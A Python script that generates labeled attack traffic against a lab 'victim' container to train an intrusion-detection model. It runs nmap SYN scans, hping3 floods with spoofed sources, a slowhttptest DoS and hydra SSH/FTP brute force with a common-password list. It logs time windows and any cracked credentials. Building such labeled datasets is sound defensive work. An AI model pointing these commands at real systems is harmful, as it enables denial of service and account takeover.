#!/usr/bin/env python3
"""
Generates synthetic attack traffic against the `victim` container and
records a labeled time window for each run.

Deliberately NOT copied/run by the Dockerfile — mount this file (see
docker-compose.yaml) and invoke it explicitly so attacks only happen when
you ask for them:

    docker compose exec attacker python3 /app/run_attacks.py

Each attack's [start, end] window + category is appended to
/logs/attack_log.csv. sniffer.py can later join a captured pcap against
that log (via --attack-log) to label flows instead of leaving everything
BENIGN.

Attack type names match the `attack_map` buckets already used in
src/model.ipynb (PortScan, DoS Hulk, DoS Slowhttptest, DDoS, SSH-Patator,
FTP-Patator) so labeled flows plug straight into the existing
LabelEncoder/attack_map without renaming.
"""
import csv
import os
import random
import re
import subprocess
import time
from datetime import datetime, timezone

VICTIM = "victim"
LOG_PATH = "/logs/attack_log.csv"
RAW_OUTPUT_DIR = "/logs/raw"
LOG_FIELDS = [
    "start_time", "end_time", "start_epoch", "end_epoch",
    "attack_category", "attack_type", "tool", "target", "target_port",
    "command", "returncode", "output_log", "credentials_found",
]

# hydra prints a line like this for every login it actually cracks:
#   [22][ssh] host: victim   login: root   password: password
HYDRA_HIT_RE = re.compile(r"login:\s*(\S+)\s+password:\s*(\S+)")

# Small guessed-credential lists just to generate realistic brute-force
# traffic shapes; not meant to be exhaustive.
CREDENTIAL_GUESSES = [
    "123456", "password", "admin", "root", "letmein", "qwerty",
    "test", "toor", "changeme", "password123",
]


def _write_wordlist(path, words):
    with open(path, "w") as f:
        f.write("\n".join(words) + "\n")


def _run(cmd, timeout):
    try:
        proc = subprocess.run(cmd, timeout=timeout, capture_output=True, text=True)
        return proc.returncode, proc.stdout, proc.stderr
    except subprocess.TimeoutExpired as e:
        stdout = e.stdout.decode() if isinstance(e.stdout, bytes) else (e.stdout or "")
        stderr = e.stderr.decode() if isinstance(e.stderr, bytes) else (e.stderr or "")
        return -1, stdout, stderr
    except FileNotFoundError as e:
        print(f"[!] {cmd[0]} not found: {e}", flush=True)
        return -2, "", str(e)


def _save_raw_output(attack_type, start, stdout, stderr):
    os.makedirs(RAW_OUTPUT_DIR, exist_ok=True)
    path = os.path.join(
        RAW_OUTPUT_DIR,
        f"{attack_type.replace(' ', '_')}_{start.strftime('%Y%m%dT%H%M%SZ')}.log",
    )
    with open(path, "w") as f:
        f.write("=== STDOUT ===\n")
        f.write(stdout)
        f.write("\n=== STDERR ===\n")
        f.write(stderr)
    return path


def _find_hydra_hits(stdout):
    hits = HYDRA_HIT_RE.findall(stdout)
    return "; ".join(f"{login}:{password}" for login, password in hits)


def _log_attack(entry):
    os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
    file_exists = os.path.exists(LOG_PATH)
    with open(LOG_PATH, "a", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=LOG_FIELDS)
        if not file_exists:
            writer.writeheader()
        writer.writerow(entry)


def attack(category, attack_type, tool, target, port, cmd, timeout):
    print(f"[+] Starting {attack_type} ({tool}) -> {target}:{port}", flush=True)
    start = datetime.now(timezone.utc)
    rc, stdout, stderr = _run(cmd, timeout)
    end = datetime.now(timezone.utc)
    output_log = _save_raw_output(attack_type, start, stdout, stderr)
    credentials_found = _find_hydra_hits(stdout) if tool == "hydra" else ""
    _log_attack({
        "start_time": start.isoformat(),
        "end_time": end.isoformat(),
        "start_epoch": start.timestamp(),
        "end_epoch": end.timestamp(),
        "attack_category": category,
        "attack_type": attack_type,
        "tool": tool,
        "target": target,
        "target_port": port,
        "command": " ".join(cmd),
        "returncode": rc,
        "output_log": output_log,
        "credentials_found": credentials_found,
    })
    hit_note = f" -- CREDENTIALS FOUND: {credentials_found}" if credentials_found else ""
    print(f"[+] Finished {attack_type} in {(end - start).total_seconds():.1f}s (rc={rc}){hit_note}", flush=True)


def port_scan():
    attack(
        category="Port Scan", attack_type="PortScan", tool="nmap",
        target=VICTIM, port="1-1000",
        cmd=["nmap", "-sS", "-p", "1-1000", "-T4", VICTIM],
        timeout=90,
    )


def dos_hulk():
    # hping3 --flood runs until killed; the subprocess timeout bounds it.
    attack(
        category="DoS", attack_type="DoS Hulk", tool="hping3",
        target=VICTIM, port=80,
        cmd=["hping3", "-S", "-p", "80", "--flood", "--rand-source", VICTIM],
        timeout=20,
    )


def dos_slowhttptest():
    attack(
        category="DoS", attack_type="DoS Slowhttptest", tool="slowhttptest",
        target=VICTIM, port=80,
        cmd=["slowhttptest", "-c", "500", "-H", "-i", "5", "-r", "200",
             "-t", "GET", "-u", f"http://{VICTIM}/", "-x", "24", "-p", "3",
             "-l", "20"],
        timeout=40,
    )


def ddos():
    attack(
        category="DDoS", attack_type="DDoS", tool="hping3",
        target=VICTIM, port=80,
        cmd=["hping3", "-S", "-p", "80", "--flood", "--rand-source",
             "-i", "u200", VICTIM],
        timeout=20,
    )


def brute_force_ssh():
    wordlist = "/tmp/ssh_passwords.txt"
    _write_wordlist(wordlist, CREDENTIAL_GUESSES)
    attack(
        category="Brute Force", attack_type="SSH-Patator", tool="hydra",
        target=VICTIM, port=22,
        cmd=["hydra", "-l", "root", "-P", wordlist, "-t", "4", "-f",
             f"ssh://{VICTIM}"],
        timeout=60,
    )


def brute_force_ftp():
    wordlist = "/tmp/ftp_passwords.txt"
    _write_wordlist(wordlist, CREDENTIAL_GUESSES)
    attack(
        category="Brute Force", attack_type="FTP-Patator", tool="hydra",
        target=VICTIM, port=21,
        cmd=["hydra", "-l", "root", "-P", wordlist, "-t", "4", "-f",
             f"ftp://{VICTIM}"],
        timeout=60,
    )


ATTACKS = [port_scan, dos_hulk, dos_slowhttptest, ddos, brute_force_ssh, brute_force_ftp]


def main():
    scenarios = list(ATTACKS)
    random.shuffle(scenarios)
    print(f"[+] Running {len(scenarios)} attack scenarios against {VICTIM}", flush=True)
    for fn in scenarios:
        fn()
        gap = random.uniform(5, 15)
        print(f"[+] Sleeping {gap:.1f}s before next scenario", flush=True)
        time.sleep(gap)
    print(f"[+] Done. Attack log written to {LOG_PATH}", flush=True)


if __name__ == "__main__":
    main()
